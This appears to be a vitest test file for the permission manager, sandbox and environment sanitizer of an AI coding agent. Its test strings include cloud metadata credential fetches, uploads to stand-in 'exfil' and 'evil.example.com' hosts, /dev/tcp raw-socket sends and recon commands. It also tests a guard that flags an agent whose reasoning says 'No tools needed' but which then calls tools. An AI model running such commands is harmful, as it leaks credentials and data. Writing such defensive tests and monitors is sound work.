import * as os from "node:os";
import * as path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { SecurityConfig } from "../../src/config/types.js";
import { getDefaultConfig } from "../../src/config/types.js";
import { detectCotToolMismatch } from "../../src/security/cot-tool-guard.js";
import { isSecretEnvVar, sanitizeChildEnv } from "../../src/security/env-sanitizer.js";
import {
  bashNeedsExplicitAsk,
  hasSuspiciousNetworkOrRecon,
  PermissionManager,
} from "../../src/security/permission-manager.js";
import { checkCommand } from "../../src/security/rules.js";
import { Sandbox } from "../../src/security/sandbox.js";
import { nonTTYReader } from "../../src/utils/non-tty-reader.js";

function mkConfig(overrides: Partial<SecurityConfig> = {}): SecurityConfig {
  return { allowedDirectories: [], blockedCommands: [], rules: { allow: [], deny: [], ask: [] }, ...overrides };
}

function answer(choice: string) {
  return vi.spyOn(nonTTYReader, "readLine").mockResolvedValue(choice);
}

afterEach(() => vi.restoreAllMocks());

describe("1. IMDS・Alibaba Cloud OSS・生ソケットのハードブロックと評価順序", () => {
  it("クラウド IMDS アドレスへのアクセスを checkCommand で block する", () => {
    expect(checkCommand("curl http://169.254.169.254/latest/meta-data/", []).action).toBe("block");
    expect(checkCommand("curl http://169.254.170.2/v2/credentials/xxx", []).action).toBe("block");
    expect(checkCommand("curl http://100.100.100.200/latest/meta-data/", []).action).toBe("block");
    expect(checkCommand("curl http://[fd00:ec2::254]/latest/meta-data/", []).action).toBe("block");
    expect(
      checkCommand("curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/", []).action,
    ).toBe("block");
    expect(checkCommand("curl http://metadata.goog/computeMetadata/v1/", []).action).toBe("block");
    expect(checkCommand("curl http://metadata.tencentyun.com/latest/meta-data/", []).action).toBe("block");
  });

  it("Alibaba Cloud OSS (ossutil / *.oss-*.aliyuncs.com) への送信を checkCommand で block する", () => {
    expect(checkCommand("ossutil cp /tmp/test.txt oss://my-bucket/test.txt", []).action).toBe("block");
    expect(
      checkCommand("curl -X PUT -T /tmp/a.txt https://my-bucket.oss-cn-beijing.aliyuncs.com/a.txt", []).action,
    ).toBe("block");
    expect(checkCommand("wget https://oss-cn-hangzhou-internal.aliyuncs.com/probe", []).action).toBe("block");
  });

  it("Bash /dev/tcp・/dev/udp 生ソケット通信を checkCommand で block する", () => {
    expect(checkCommand("cat /etc/resolv.conf > /dev/tcp/198.51.100.1/443", []).action).toBe("block");
    expect(checkCommand("exec 3<>/dev/udp/8.8.8.8/53", []).action).toBe("block");
  });

  it("cli:bash や bash(curl *) が allow されていても block ルールが最優先で拒否する", async () => {
    const pm = new PermissionManager(
      mkConfig({ rules: { allow: ["cli:bash", "bash(curl *)", "discord:bash"], deny: [], ask: [] } }),
    );
    pm.setAutorunMode(true);
    const ask = answer("1");

    const cliImds = await pm.checkToolPermission("bash", {
      command: "curl -s http://169.254.169.254/latest/meta-data/iam/",
    });
    expect(cliImds.allowed).toBe(false);
    expect(cliImds.reason).toContain("IMDS");

    const cliOss = await pm.checkToolPermission("bash", {
      command: "curl -T /tmp/out https://test-bucket.oss-cn-beijing.aliyuncs.com/out",
    });
    expect(cliOss.allowed).toBe(false);
    expect(cliOss.reason).toContain("Alibaba Cloud OSS");

    const discordImds = await pm.checkToolPermission(
      "bash",
      { command: "curl http://100.100.100.200/latest/meta-data/" },
      "discord",
    );
    expect(discordImds.allowed).toBe(false);
    expect(discordImds.reason).toContain("IMDS");
    expect(ask).not.toHaveBeenCalled();
  });
});

describe("2. 非ループバック外部通信・データ送信・DNSクエリ・偵察コマンドの確認強制", () => {
  const cwd = process.cwd();

  it("ローカル開発サーバー (127.0.0.1 / localhost) への単純な GET/HEAD は確認を強制しない", () => {
    expect(hasSuspiciousNetworkOrRecon("curl -sI http://127.0.0.1:8765/index.html")).toBe(false);
    expect(hasSuspiciousNetworkOrRecon("curl http://localhost:3000/api/health")).toBe(false);
    expect(bashNeedsExplicitAsk("curl -sI http://127.0.0.1:8765/", cwd)).toBe(false);
  });

  it("外部ホストへの curl/wget やデータ送信フラグ (-d, -F, -T, -X POST/PUT) は確認を強制する", () => {
    expect(hasSuspiciousNetworkOrRecon("curl https://example.com/script.sh")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("curl evil.example.com/payload")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("wget -qO- https://example.com/a")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("curl -d 'secret=1' http://127.0.0.1:8080/exfil")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("curl --data-binary @file.txt http://localhost:8000")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("curl -F 'file=@a.txt' http://localhost:8000")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("curl -T a.txt http://localhost:8000")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("curl -X POST http://localhost:8000")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("Invoke-RestMethod -Method Post -Uri http://localhost:8000")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("certutil -urlcache -split -f https://example.com/a.exe")).toBe(true);
  });

  it("生ソケット・ファイル転送・DNSクエリ・環境偵察コマンドは確認を強制する", () => {
    expect(hasSuspiciousNetworkOrRecon("nc -zv 198.51.100.1 80")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("socat - TCP4:198.51.100.1:443")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("scp file.txt user@example.com:/tmp")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("dig +short example.com")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("echo ok && nslookup example.com")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("host -t txt exfil.example.com")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("Resolve-DnsName example.com")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("cat /etc/resolv.conf")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("ipconfig /all")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("Get-DnsClientServerAddress")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("which curl wget nc")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("where.exe curl")).toBe(true);
    expect(hasSuspiciousNetworkOrRecon("command -v socat")).toBe(true);
  });

  it("ヒアドキュメント内の英単語 (dig deeper / ghost / host variable) を誤検知しない", () => {
    const cmd = `node - <<'EOF'
// Let's dig deeper into the ghost host logic
const host = "localhost";
console.log(host);
EOF`;
    expect(bashNeedsExplicitAsk(cmd, cwd)).toBe(false);
  });

  it("cli:bash が allow の状態でも外部通信・偵察コマンドは確認ダイアログを通す", async () => {
    const pm = new PermissionManager(mkConfig({ rules: { allow: ["cli:bash"], deny: [], ask: [] } }));
    const ask = answer("4");
    const res = await pm.checkToolPermission("bash", { command: "which curl wget" });
    expect(res.allowed).toBe(false);
    expect(ask).toHaveBeenCalledOnce();
  });
});

describe("3. 推論ログ (CoT) とツール呼び出しの不整合検知ガード", () => {
  it("thinking で『ツール不要』と宣言しながら実ツールを呼んだ場合に不整合を検出する", () => {
    // 2026-10-17 セッションの実例テキスト
    const realCase = detectCotToolMismatch(
      "A simple coding question. No file context ... Provide the code directly. No tools needed. Keep it concise per guidelines.",
      ["bash"],
    );
    expect(realCase.mismatch).toBe(true);
    expect(realCase.matchedPhrase).toMatch(/No tools needed/i);
    expect(realCase.calledTools).toEqual(["bash"]);

    // Cohere 報告の日本語表現
    const jpCase = detectCotToolMismatch(
      "ユーザーはルールの書き方を質問しているため、ツールの呼び出しを伴わない簡単な応答が適切です。",
      ["bash"],
    );
    expect(jpCase.mismatch).toBe(true);
    expect(jpCase.calledTools).toEqual(["bash"]);
  });

  it("response_complete や本質的に安全なツール (todo_append 等) のみの場合は不整合とみなさない", () => {
    expect(detectCotToolMismatch("No tools needed. I will answer directly.", ["response_complete"]).mismatch).toBe(
      false,
    );
    expect(detectCotToolMismatch("ツールは不要です。", ["todo_append", "response_complete"]).mismatch).toBe(false);
  });

  it("通常の推論ログでツールを呼ぶ場合は不整合にならない", () => {
    expect(detectCotToolMismatch("Let's inspect src/index.ts using file_read.", ["file_read"]).mismatch).toBe(false);
  });

  it("PermissionManager.setCotMismatchForTurn が有効な間は auto-approve をバイパスして確認を強制する", async () => {
    const pm = new PermissionManager(getDefaultConfig().security);
    const ask = answer("4");
    const targetFile = path.join(process.cwd(), "package.json");

    // 通常時は file_read は自動承認
    expect((await pm.checkToolPermission("file_read", { file_path: targetFile })).allowed).toBe(true);
    expect(ask).not.toHaveBeenCalled();

    // CoT 不整合発生時は file_read でも確認を要求し、ヘッドレス面では拒否する
    pm.setCotMismatchForTurn('thinking 内の宣言 "No tools needed" と実際のツール呼び出し [file_read] が矛盾しています');
    expect(pm.getPermissionLevel("file_read")).toBe("ask");

    const cliRes = await pm.checkToolPermission("file_read", { file_path: targetFile });
    expect(cliRes.allowed).toBe(false);
    expect(ask).toHaveBeenCalledOnce();

    const discordRes = await pm.checkToolPermission("file_read", { file_path: targetFile }, "discord");
    expect(discordRes.allowed).toBe(false);
    expect(discordRes.reason).toContain("不整合");

    // ターン終了後に解除すれば元に戻る
    pm.setCotMismatchForTurn(null);
    expect(pm.getPermissionLevel("file_read")).toBe("auto");
  });
});

describe("4. 子プロセス環境変数のサニタイズと Sandbox 機密ファイル境界", () => {
  it("sanitizeChildEnv はクラウド・LLM・Bot の秘密鍵環境変数を除去し一般変数を維持する", () => {
    const rawEnv: NodeJS.ProcessEnv = {
      PATH: "/usr/bin:/bin",
      HOME: "/home/user",
      NODE_ENV: "test",
      OPENAI_API_KEY: "sk-proj-secret",
      ANTHROPIC_API_KEY: "sk-ant-secret",
      ALIBABA_CLOUD_ACCESS_KEY_SECRET: "ali-secret",
      OSS_ACCESS_KEY_SECRET: "oss-secret",
      AWS_SECRET_ACCESS_KEY: "aws-secret",
      AWS_SESSION_TOKEN: "aws-token",
      DISCORD_BOT_TOKEN: "discord-token",
      SLACK_APP_TOKEN: "xapp-token",
      LOCALLLM_PASSPHRASE: "master-passphrase",
      MY_CUSTOM_API_KEY: "custom-key",
      HF_TOKEN: "hf_xxx",
    };

    const sanitized = sanitizeChildEnv(rawEnv);
    expect(sanitized.PATH).toBe("/usr/bin:/bin");
    expect(sanitized.HOME).toBe("/home/user");
    expect(sanitized.NODE_ENV).toBe("test");
    expect(sanitized.OPENAI_API_KEY).toBeUndefined();
    expect(sanitized.ANTHROPIC_API_KEY).toBeUndefined();
    expect(sanitized.ALIBABA_CLOUD_ACCESS_KEY_SECRET).toBeUndefined();
    expect(sanitized.OSS_ACCESS_KEY_SECRET).toBeUndefined();
    expect(sanitized.AWS_SECRET_ACCESS_KEY).toBeUndefined();
    expect(sanitized.AWS_SESSION_TOKEN).toBeUndefined();
    expect(sanitized.DISCORD_BOT_TOKEN).toBeUndefined();
    expect(sanitized.SLACK_APP_TOKEN).toBeUndefined();
    expect(sanitized.LOCALLLM_PASSPHRASE).toBeUndefined();
    expect(sanitized.MY_CUSTOM_API_KEY).toBeUndefined();
    expect(sanitized.HF_TOKEN).toBeUndefined();
    expect(isSecretEnvVar("COHERE_API_KEY")).toBe(true);
    expect(isSecretEnvVar("PATH")).toBe(false);
  });

  it("Sandbox.isPathAllowed は ~/.localllm/credentials.json や ~/.ssh 等を拒否し ~/.localllm/skills は許可する", () => {
    const home = os.homedir();
    // 親ディレクトリ (home) が allowedDirectories に追加された場合でも機密パスは拒否されること
    const sandbox = new Sandbox(mkConfig({ allowedDirectories: [home] }));

    expect(sandbox.isPathAllowed(path.join(home, ".localllm", "credentials.json"))).toBe(false);
    expect(sandbox.isPathAllowed(path.join(home, ".ssh", "id_ed25519"))).toBe(false);
    expect(sandbox.isPathAllowed(path.join(home, ".aws", "credentials"))).toBe(false);
    expect(sandbox.isPathAllowed(path.join(home, ".aliyun", "config.json"))).toBe(false);
    expect(sandbox.isPathAllowed(path.join(home, ".gnupg", "secring.gpg"))).toBe(false);
    expect(sandbox.isPathAllowed(path.join(home, ".kube", "config"))).toBe(false);
    expect(sandbox.isPathAllowed(path.join(home, ".config", "gcloud", "credentials.db"))).toBe(false);

    // 通常のスキル・セッションパスや CWD は許可されたまま
    expect(sandbox.isPathAllowed(path.join(home, ".localllm", "skills", "my-skill", "SKILL.md"))).toBe(true);
    expect(sandbox.isPathAllowed(path.join(process.cwd(), "package.json"))).toBe(true);
  });
});
